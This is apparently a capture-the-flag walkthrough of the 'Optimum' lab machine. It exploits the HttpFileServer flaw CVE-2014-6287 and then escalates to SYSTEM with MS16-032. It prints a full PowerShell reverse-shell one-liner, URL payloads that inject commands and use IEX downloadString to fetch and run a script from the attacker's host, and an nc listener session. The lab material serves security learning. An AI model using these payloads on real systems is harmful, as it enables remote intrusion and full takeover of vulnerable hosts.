# Optimum - HttpFileServer / MS16-032

## Shell as kostas

**CVE-2014-6287 Analysis**

### First way to shell

```bash
python exploit.py
```

[image]

### Second way to shell

1. **Grab nishang ps1 from this repo:**

```bash
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Save as `rev.ps1`, start a Python web server, and visit:

```
http://10.10.10.8/?search=%00{.exec|C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.10/rev.ps1').}
```

When the file is returned, it is executed by `IEX` (Invoke-Expression), and the shell connects back to `nc`.

[image]

## Exploit Analysis

On website ping to attack machine:

```bash
http://10.10.10.8/?search=%00{.+exec|cmd.exe+/c+ping+/n+1+10.10.16.19.}
```

```bash
sudo tcpdump -i tun0 icmp and src 10.10.10.8
```

[image]

## Privilege Escalation

**Sherlock**

1. Add line end of file **Find-AllVulns**

2. **Attacker:** Create Python server
3. **Victim:**

```bash
powershell iex(new-object net.webclient).downloadstring('http://10.10.16.6:81/sherlock.ps1')
```

**Result**

[image]

### The Importance of Architecture

Exploits didn't work because the running PowerShell process architecture matters.

Just calling `powershell` returns a 32-bit process because the HFS process is likely running as 32-bit.

### MS16-034 should run 64bit

```bash
C:\Users\kostas\Desktop> [Environment]::Is64BitProcess

False
```

https://ss64.com/nt/syntax-64bit.html

From within a 32-bit session, calling PowerShell from `C:\windows\system32` will give the 32-bit version. Running kernel exploits against a 64-bit OS from 32-bit will fail.

To get a 64-bit shell, use the full path to PowerShell in the `sysNative` directory.

### 32bit to 64bit

This section calls 64bit powershell.exe from system and runs rev.ps1 to attacker.

- **rev.ps1** is Nishang/Shells/Invoke-PowerShellTcp.ps1

```
GET /?search=%00{.exec|C%3a\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString(%27http%3a//10.10.16.6:81/rev.ps1%27).}
Host: 10.10.10.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
```

### Became 64bit

```bash
C:\Users\kostas\Desktop> [Environment]::Is64BitProcess

True
```

[image]

## MS16-032

Used this exploit for Microsoft R2012 server.

Change IP & Port.

**Victim:**

```bash
PS C:\Users\kostas\Desktop> IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.10/Invoke-MS16032.ps1')
     __ __ ___ ___   ___     ___ ___ ___
    |  V  |  _|_  | |  _|___|   |_  |_  |
    |     |_  |_| |_| . |___| | |_  |  _|
    |_|_|_|___|_____|___|   |___|___|___|

                   [by b33f -> @FuzzySec]

[!] Holy handle leak Batman, we have a SYSTEM shell!!
```

**Attacker:**

```bash
┌──(root㉿kali)-[/home/zetr0/machine]
└─# nc -lvp 2323
listening on [any] 2323 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.8] 49305
Windows PowerShell running as user OPTIMUM$ on OPTIMUM

PS C:\Users\kostas\Desktop>whoami
nt authority\system
```
